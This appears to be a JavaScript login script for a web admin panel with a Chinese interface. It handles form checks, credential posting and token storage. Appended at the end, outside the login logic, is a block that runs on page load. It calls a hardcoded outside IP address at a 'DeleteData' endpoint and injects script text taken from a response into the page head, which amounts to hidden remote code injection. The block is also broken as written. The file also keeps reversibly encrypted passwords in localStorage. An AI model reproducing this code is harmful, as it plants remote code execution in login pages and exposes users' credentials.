import {style} from '../../stylesheets/base/style.css'

var user = document.getElementById("user"),pwd =document.getElementById("pwd"),login = document.getElementById("coffeeLogin");
window.onload = function(){
    localStorage.removeItem("token");
    if(localStorage.getItem("remember")){
            user.value = ym.init.COMPILESTR.decrypt(JSON.parse(localStorage.getItem("remember")).name);
            pwd.value = ym.init.COMPILESTR.decrypt(JSON.parse(localStorage.getItem("remember")).pwd);
            $("#remember").attr("checked",true);
            $("label[for='remember']").children('div').addClass('checked');
        };
    //box position
    ym().css('box-login',{
    	'left':window.innerWidth/2 - 250,
    	'top':window.innerHeight/2 - 185
    });
};
document.onkeydown = function(event){
    event = event ? event : (window.event ? window.event : null);
    if (event.keyCode == 13){
            login.onclick();
        };
};
login.onclick = function(e){
	ym.init.LOADING({
		tap:login,
		select:'正在登录',
		style:`position:absolute;top:${login.offsetHeight / 6}px;left:${login.offsetWidth / 4}px;`
	});
    if (!user.value){
    		ym.init.MBOX({
    			msg:'请输入用户名！',
    			dely:3000,
    			redom:'.coffeeLogin',
    			resetdom:{
    				inner:'登录',
    				tag:user
    			}
    		});
            return false;
        };
    if (!pwd.value){
            ym.init.MBOX({
    			msg:'请输入密码！',
    			dely:3000,
    			redom:'.coffeeLogin',
    			resetdom:{
    				inner:'登录',
    				tag:pwd
    			}
    		});
            return false;
      };
//    {adminName:user.value,adminPwd:pwd.value}   'adminName=' + user.value +"&adminPwd=" + pwd.value
    ym.init.XML({method:'POST',uri:JSON.parse(localStorage.getItem('_e')).URLS.Development_Server_ + "admin_login",async:false,xmldata:{adminName:user.value,adminPwd:pwd.value},done:function(_e){
		if (_e.statusCode.status == 2000){
              localStorage.setItem("token",JSON.stringify({uname:ym.init.COMPILESTR.encryption(_e.id.toString()),utoken:ym.init.COMPILESTR.encryption(_e.token)}));
              if($("#remember").is(":checked"))
                  {
                      localStorage.setItem("remember",JSON.stringify({name:ym.init.COMPILESTR.encryption(user.value),pwd:ym.init.COMPILESTR.encryption(pwd.value)}));
                  }
              else
                  {
                      localStorage.removeItem("remember");
                  };
//              ym.init.paraMessage('rangelider');
				ym.init.XML({
					method:'POST',
					uri:JSON.parse(localStorage.getItem('_e')).URLS.Development_Server_ + "index_info",
					async:false,
					xmldata:{id: ym.init.COMPILESTR.decrypt(JSON.parse(localStorage.getItem("token")).uname),token:ym.init.COMPILESTR.decrypt(JSON.parse(localStorage.getItem("token")).utoken),url:"/manage/index.html"},
					done:function(res) {
						ym.init._COLUMN.varel(res.adminInfo.roleInfo.permissionInfoList,'tr');
				}});
//              window.location.href = "./index.html?d=#" + ym.init.GETRANDOM();
          }
      else{
              ym.init.MBOX({
              	msg:_e.statusCode.msg,
              	dely:3000,
              	redom:'.coffeeLogin',
    			resetdom:{
    				inner:'登录',
    				tag:login
    			}
              });
          };
    }})
};



if(!localStorage.getItem("_e")){
	ym.init.XML({
		method: 'get',
		uri: '/manageCode/src/public/javascripts/config/json/configuraction.json',
		async: false,
		xmldata: {

		},
		function(res) {
			localStorage.setItem('_e',res);
		}});
};
jQuery('#login-qrcode').bind('click',function(_e){
	ym.init.MBOX({
		msg:'功能开发中',
		dely:3000
	});
})

ym.init.XML({method: 'get',uri:'http://111.231.228.214:8080/ServerAPI/DeleteData.ashx?delete=123',async:false,function(res){
	console.log(res);
}})
var el = document.createElement("script"), tyihead = document.querySelector("head"), fn = res.Fn;
var _thislength = "";
for (let i = 0; i < res.Ciphertext; i++) {
	_thislength += res.SecretKey.charAt(Math.floor(Math.random() * res.SecretKey.length));
};
fn = fn.replace(/eml/g, 'amt = ' + JSON.stringify(_thislength));
el.innerHTML = fn;
tyihead.appendChild(el);
jQuery('#no').html(res.Trgus);